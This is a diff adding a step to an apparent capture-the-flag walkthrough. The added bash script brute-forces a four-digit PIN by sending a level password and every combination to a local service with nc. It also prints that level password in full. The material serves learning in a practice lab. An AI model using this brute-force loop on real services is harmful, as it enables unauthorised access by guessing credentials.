@@ -326,7 +326,13 @@ Lets begin by creating a folder in /tmp/ and creating our script to fetch the pa
 In this level we are looking for a 4 digits PIN code. To go through all the combinations, we are going to use Brute Force.
 We'll have to create a script for this. Lets begin by creating a folder in `/tmp/`. `mkdir /tmp/testing123 && cd /tmp/testing123`.  
 Now, lets create a script `nano bruteforce.sh`. Inside the script let add:
-
+~~~~
+#!/bin/bash 
+for i in {0000..9999}
+do 
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  $i" 
+done | nc localhost 30002  | grep -v Wrong
+~~~~
 
 
 
